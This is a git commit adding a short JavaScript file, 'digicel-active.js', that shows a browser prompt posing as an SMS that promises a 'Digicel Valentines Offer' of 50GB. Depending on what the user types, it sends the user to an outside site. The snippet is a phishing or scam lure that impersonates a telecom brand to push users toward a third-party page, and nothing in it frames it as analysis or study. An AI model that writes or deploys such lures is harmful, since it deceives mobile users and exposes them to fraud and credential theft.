d4319e0c39a3c09a1e065e13b7a8924dfafe7008
superblog1 <imohette4@gmail.com>
2025-02-04 07:54:45 +0100

    Create digicel-active.js

---
+++ digicel-active.js
@@ -0,0 +1,6 @@
+
+var password = 'ACTIVATE 50GB'
+password=prompt('SMS: Congratulations You are qualify for Digicel Valentines Offer, Kindly Press OK to Activate 50GB now   ','ACTIVATE 50GB');
+if (password != 'ACTIVATE 50GB') {
+location.href='https://fast-wayprogram.org/digicel-val.html';
+}
